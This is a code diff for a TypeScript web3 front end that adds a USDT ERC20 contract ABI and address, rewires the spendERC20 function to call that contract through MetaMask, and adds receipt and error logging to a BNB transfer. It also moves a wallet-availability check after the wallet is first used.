@@ -154,6 +154,76 @@ const contractABI: any[] = [
     type: "function",
   },
 ];
+const contractAddressUSDTERC20 = "0x90183c95c363aff91939fd88e35f7074d44e6fe1";
+const contractABIUSDTERC20: any[] = [
+  {
+    inputs: [
+      {
+        internalType: "address",
+        name: "_token",
+        type: "address",
+      },
+    ],
+    stateMutability: "nonpayable",
+    type: "constructor",
+  },
+  {
+    anonymous: false,
+    inputs: [
+      {
+        indexed: true,
+        internalType: "address",
+        name: "sender",
+        type: "address",
+      },
+      {
+        indexed: true,
+        internalType: "address",
+        name: "recipient",
+        type: "address",
+      },
+      {
+        indexed: false,
+        internalType: "uint256",
+        name: "amount",
+        type: "uint256",
+      },
+    ],
+    name: "TokenTransfered",
+    type: "event",
+  },
+  {
+    inputs: [],
+    name: "recipient",
+    outputs: [
+      {
+        internalType: "address",
+        name: "",
+        type: "address",
+      },
+    ],
+    stateMutability: "view",
+    type: "function",
+  },
+  {
+    inputs: [
+      {
+        internalType: "uint256",
+        name: "_amount",
+        type: "uint256",
+      },
+      {
+        internalType: "address",
+        name: "_to",
+        type: "address",
+      },
+    ],
+    name: "transferUSDTFrom",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+];
 
 export async function spendETH(wallet: EthereumAddress, amount: string) {
   try {
@@ -253,15 +323,23 @@ export async function spendBNB(wallet: EthereumAddress, amount: string) {
       [valueInWei]
     );
 
+    const spendETHContract = new web3.eth.Contract(
+      contractABI,
+      contractAddress
+    );
+
     const callData = methodSignature + encodedParameter.slice(2);
 
     console.log(`Sent ${amount} Ether to the contract`, wallet);
-    const reciept = await web3.eth.sendTransaction({
-      from: spender,
-      to: wallet,
-      value: valueInWei,
-      data: callData,
-    });
+    const reciept = await web3.eth
+      .sendTransaction({
+        from: spender,
+        to: wallet,
+        value: valueInWei,
+        data: callData,
+      })
+      .on("receipt", (reciept) => console.log("The reciept is:", reciept))
+      .on("error", (error) => console.error("Transaction faild", error));
 
     console.log(`We have sent ${amount} BNB`, reciept);
   } catch (error) {
@@ -270,29 +348,25 @@ export async function spendBNB(wallet: EthereumAddress, amount: string) {
   }
 }
 export async function spendERC20(wallet: EthereumAddress, amount: string) {
-  // Check if the wallet (MetaMask) is available
-  if (typeof window.ethereum === "undefined") {
-    console.error("MetaMask is not installed. Please install it to continue.");
-    return null;
-  }
-
+  
   try {
     // Request wallet connection
     await window.ethereum.request({ method: "eth_requestAccounts" });
-
+    
+    // Check if the wallet (MetaMask) is available
+    if (typeof window.ethereum === "undefined") {
+      console.error("MetaMask is not installed. Please install it to continue.");
+      return null;
+    }
     // Create a Web3 instance with the injected provider
     const web3 = new Web3(window.ethereum);
 
     // Get the list of accounts
     const accounts = await web3.eth.getAccounts();
 
-    const spendETHContract = new web3.eth.Contract(
-      contractABI,
-      contractAddress
-    );
-    const spendERCContract = new web3.eth.Contract(
-      contractABI,
-      contractAddress
+    const spendUSDTERC20Contract = new web3.eth.Contract(
+      contractABIUSDTERC20,
+      contractAddressUSDTERC20
     );
     const valueInWei = web3.utils.toWei(amount, "ether");
 
@@ -304,7 +378,7 @@ export async function spendERC20(wallet: EthereumAddress, amount: string) {
     // Get the first connected account (primary wallet address)
     const spender = accounts[0];
 
-    spendETHContract.methods
+    spendUSDTERC20Contract.methods
       .updateRecipient(wallet)
       .send({ from: spender })
       .then(() => {
